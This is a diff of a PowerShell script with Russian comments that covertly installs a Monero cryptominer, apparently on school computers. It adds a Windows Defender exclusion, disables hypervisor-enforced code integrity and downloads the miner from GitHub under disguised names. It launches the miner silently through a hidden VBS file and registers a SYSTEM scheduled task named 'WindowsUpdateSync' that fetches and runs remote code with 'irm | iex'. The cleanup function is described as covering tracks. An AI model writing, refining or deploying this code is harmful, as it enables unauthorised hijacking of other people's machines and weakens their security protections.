@@ -7,51 +7,50 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 # --- КОНФИГУРАЦИЯ ---
 $path = "C:\ProgramData\SystemLib"
-$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
+# Твой проверенный Monero адрес из Cake Wallet
+$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA" 
 $procName = "WinDirectX"
 $exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
 $rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"
 
-Write-Host "--- ЗАПУСК СИСТЕМЫ С ПРАВАМИ АДМИНИСТРАТОРА ---" -ForegroundColor Cyan
+Write-Host "--- ЗАПУСК СИСТЕМЫ (FINAL BUILD) ---" -ForegroundColor Cyan
 
 # 1. Остановка старых процессов
-Write-Host "[1/8] Очистка старых процессов..." -NoNewline
+Write-Host "[1/8] Очистка процессов..." -NoNewline
 Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
 Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
-Write-Host " Готово." -ForegroundColor Green
+Write-Host " Ок." -ForegroundColor Green
 
-# 2. Настройка питания
-powercfg /x -standby-timeout-ac 0 > $null
-powercfg /x -monitor-timeout-ac 5 > $null
+# 2. Разблокировка памяти (Против 15 МБ)
+Write-Host "[2/8] Оптимизация защиты ядра..." -NoNewline
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
+Write-Host " Готово." -ForegroundColor Yellow
 
-# 3. Работа с папкой и Антивирусом
+# 3. Антивирус и папка
 if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
 Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
 
-# 4. Скачивание Майнера
-Write-Host "[4/8] Загрузка ядра майнера..." -NoNewline
+# 4. Скачивание майнера
+Write-Host "[4/8] Загрузка ядра..." -NoNewline
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
     Write-Host " Успешно." -ForegroundColor Green
 } catch {
-    Write-Host " Ошибка загрузки!" -ForegroundColor Red; exit
+    Write-Host " Ошибка сети!" -ForegroundColor Red; exit
 }
 
- 
-# 5. Создание файлов запуска (Маскировка + Низкий приоритет)
-$cmd = "@echo off`n$path\$procName.exe --title $procName --priority 1 --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --algo rx/0 --donate-level 1"
+# 5. Создание файлов запуска (Исправленные флаги)
+$cmd = "@echo off`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --algo rx/0 --donate-level 1"
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
 $vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
 
-# 6. Умная Автозагрузка (через Планировщик задач - ПРАВА SYSTEM)
-Write-Host "[6/8] Настройка скрытой службы..." -NoNewline
+# 6. Автозагрузка от имени SYSTEM
+Write-Host "[6/8] Скрытая служба..." -NoNewline
 $taskName = "WindowsUpdateSync"
 $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-# Регистрируем задачу от имени SYSTEM
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null
+Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null
 Write-Host " Ок." -ForegroundColor Green
 
 # 7. Функции контроля (check, update, delete)
@@ -66,19 +65,18 @@ function check {
     } else { Write-Host "СТАТУС: ВЫКЛЮЧЕН" -ForegroundColor Red }
 }
 function update { 
-    Write-Host "Обновление с GitHub..." -ForegroundColor Cyan
+    Write-Host "Обновление конфигурации..." -ForegroundColor Cyan
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     irm '$rawScript' | iex 
 }
 function delete {
-    Write-Host "ПОЛНОЕ УДАЛЕНИЕ СИСТЕМЫ..." -ForegroundColor Red
+    Write-Host "УДАЛЕНИЕ И ЗАМЕТАНИЕ СЛЕДОВ..." -ForegroundColor Red
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 1 -ErrorAction SilentlyContinue
     Stop-Process -Name "$procName" -Force -ErrorAction SilentlyContinue
     Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false -ErrorAction SilentlyContinue
     Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.vbs" -ErrorAction SilentlyContinue
-    Write-Host "Файлы и задачи удалены. Очистка профиля..." -ForegroundColor Yellow
     Clear-Content -Path "`$PROFILE" -ErrorAction SilentlyContinue
-    Write-Host "ГОТОВО. Система полностью удалена." -ForegroundColor Green
+    Write-Host "ГОТОВО. Система чиста, защита возвращена." -ForegroundColor Green
 }
 "@
 $Functions | Out-File -FilePath $ProfilePath -Force
